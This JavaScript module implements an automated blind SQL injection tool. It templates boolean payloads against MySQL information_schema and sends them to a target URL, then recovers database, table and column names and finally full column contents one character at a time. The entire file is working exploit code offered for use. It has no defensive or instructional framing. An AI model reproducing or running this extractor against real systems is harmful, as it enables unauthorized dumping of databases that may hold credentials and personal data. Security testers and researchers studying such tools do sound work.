const Mustache = require('mustache');
const Requester = require('./requester');

Mustache.escape = text => text;

class SQLi {
    constructor(options) {
        console.log(options);
        this.db = options.db;
        this.url = options.url;
        this.data = options.data;
        this.query = options.query;
        this.table = options.table;
        this.column = options.column;
        this.method = options.method;
        this.timeout = options.timeout;
        this.condition = options.condition;
        this.requester = new Requester(
            options.url,
            options.method,
            options.condition
        );
    }

    request(data) {
        return this.requester.request(this.url, this.method, data, this.condition);
    }

    async iterate(query, params, numbers = [...Array(100).keys()]) {
        let target = null;

        for (let number of numbers) {
            const payload = Mustache.render(this.data, {
                timeout: this.timeout,
                column: this.column,
                table: this.table,
                db: this.db,
                number,
                ...params
            }, { query });

            console.log(payload);
            const data = new URLSearchParams(payload);
            const match = await this.request(data);

            if (match) {
                target = number;
                break;
            }
        }

        if (target === null) {
            throw new Error('Can\'t match the number');
        }

        return target;
    }

    async getObjectName(lengthQuery, charQuery, rowIndex) {
        const objectNameChars = [];
        const objectNameLength = await this.iterate(lengthQuery, { rowIndex });
        console.log(`Object #${rowIndex} name length:`, objectNameLength);

        for (let charIndex = 1; charIndex <= objectNameLength; charIndex += 1) {
            const code = await this.iterate(
                charQuery, {
                    rowIndex,
                    charIndex
                },
                SQLi.CHAR_CODES
            );

            objectNameChars.push(String.fromCharCode(code));
            console.log(objectNameChars);
        }

        const objectName = objectNameChars.join('');
        console.log(`Object #${rowIndex}:`, objectName);
        return objectName;
    }

    static CHAR_CODES = [...Array(150).keys()].map(x => x + 32);

    static async dumpDbNames(options) {
        const sqli = new SQLi(options);
        const databasesCount = await sqli.iterate(
            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql'))={{number}}"
        );

        if (databasesCount === 0) {
            throw new Error('Can\'t get databases count');
        }

        console.log('Databases count: ', databasesCount);
        const databaseNames = [];

        for (let rowIndex = 0; rowIndex < databasesCount; rowIndex += 1) {
            const databaseName = await sqli.getObjectName(
                "length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT {{rowIndex}},1))={{number}}",
                "ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
                rowIndex
            );
            databaseNames.push(databaseName);
        }

        console.log(databaseNames);
    }

    static async dumpTableNames(options) {
        const sqli = new SQLi(options);
        const tablesCount = await sqli.iterate(
            "(SELECT count(DISTINCT(table_name)) FROM information_schema.tables WHERE table_schema='{{db}}')={{number}}"
        );

        if (tablesCount === 0) {
            throw new Error('Can\'t get tables count');
        }

        console.log('Tables count: ', tablesCount);
        const tableNames = [];

        for (let rowIndex = 0; rowIndex < tablesCount; rowIndex += 1) {
            const tableName = await sqli.getObjectName(
                "length((SELECT DISTINCT table_name FROM information_schema.tables WHERE table_schema='{{db}}' LIMIT {{rowIndex}},1))={{number}}",
                "ascii(substring((SELECT DISTINCT table_name FROM information_schema.tables WHERE table_schema='{{db}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
                rowIndex
            );
            tableNames.push(tableName);
        }

        console.log(tableNames);
    }

    static async dumpColumnNames(options) {
        const sqli = new SQLi(options);
        const columnsCount = await sqli.iterate(
            "(SELECT count(DISTINCT(column_name)) FROM information_schema.columns WHERE table_name='{{table}}')={{number}}"
        );

        if (columnsCount === 0) {
            throw new Error('Can\'t get columns count');
        }

        console.log('Tables count: ', columnsCount);
        const columnNames = [];

        for (let rowIndex = 0; rowIndex < columnsCount; rowIndex += 1) {
            const columnName = await sqli.getObjectName(
                "length((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT {{rowIndex}},1))={{number}}",
                "ascii(substring((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
                rowIndex
            );
            columnNames.push(columnName);
        }

        console.log(columnNames);
    }

    static async dumpTableColumn(options) {
        const sqli = new SQLi(options);
        const rowsCount = await sqli.iterate(
            "(SELECT count({{column}}) FROM {{table}})={{number}}"
        );

        if (rowsCount === 0) {
            throw new Error('Can\'t get rows count');
        }

        console.log('Rows count: ', rowsCount);
        const columnNames = [];

        for (let rowIndex = 0; rowIndex < rowsCount; rowIndex += 1) {
            const columnName = await sqli.getObjectName(
                "length((SELECT {{column}} FROM {{table}} LIMIT {{rowIndex}},1))={{number}}",
                "ascii(substring((SELECT {{column}} FROM {{table}} LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
                rowIndex
            );

            columnNames.push(columnName);
        }

        console.log(columnNames);
    }
}

module.exports = SQLi;
